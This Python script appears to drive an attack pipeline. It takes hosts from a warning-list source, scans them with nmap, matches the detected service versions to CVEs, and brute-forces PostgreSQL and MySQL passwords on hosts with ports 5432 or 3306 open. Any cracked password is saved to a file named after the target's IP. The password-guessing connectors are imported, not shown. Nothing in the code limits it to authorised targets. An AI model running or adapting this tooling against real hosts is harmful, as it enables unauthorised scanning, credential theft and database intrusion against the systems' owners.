import ast
import logging
from pathlib import Path

import cve_retriever
import nmap_retriever
from bruteforce.mysql_conn import MySqlConnector
from bruteforce.postgresql_conn import PostgreSqlConnector
from source import cbr_warning
from util import chunk_util, file_util
from util.log import setup_logging
from repository import postgres

setup_logging()
log = logging.getLogger(__name__)

def save_nmap():
    hosts = cbr_warning.get_warning_hosts()
    processed = postgres.list_processed_hostnames()
    hosts -= processed
    log.info(f"Excluding already processed hosts. Processed: {len(processed)}, remaining: {len(hosts)}")
    chunked_hosts = chunk_util.chunk(hosts, 20)
    for hostnames in chunked_hosts:
        hosts_compacted = " ".join(hostnames)
        log.info(f"Starting nmap hosts {hosts_compacted}")
        scan_result = nmap_retriever.scan(hosts_compacted)
        postgres.save_nmap_rows(scan_result)

def save_cves():
    products = postgres.list_service_products()
    processed = postgres.list_processed_cve_products()
    remaining = [(p, v) for p, v in products if (p, v) not in processed]
    log.info(f"Excluding already processed hosts. Processed: {len(processed)}, remaining: {len(remaining)}")
    saved = 0
    for product, version in remaining:
        _, records = cve_retriever.lookup_cves(product=product, version=version)
        saved += postgres.save_service_cves(product, version, records)
    log.info(f"Saved CVEs: {saved}")

def _bruteforce_ip(scan_result, ip):
    address = scan_result.get("scan").get(ip)
    ports = address.get("tcp")
    if ports is None:
        return
    if 5432 in ports:
        pwd = PostgreSqlConnector.connect(ip)
        if pwd:
            file_util.write("bruteforce/pg/" + ip + ".txt", "w", pwd)
    if 3306 in ports:
        pwd = MySqlConnector.connect(ip)
        if pwd:
            file_util.write("bruteforce/mysql/" + ip + ".txt", "w", pwd)

def bruteforce_db():
    nmap_dir = Path("data/nmap")
    for path in sorted(nmap_dir.iterdir()):
        if not path.is_file():
            continue
        with path.open(encoding="UTF-8") as f:
            scan_result = ast.literal_eval(f.read())
        ip_addresses = scan_result.get("scan").keys()
        for ip in ip_addresses:
            _bruteforce_ip(scan_result, ip)

if __name__ == "__main__":
    save_nmap()
    save_cves()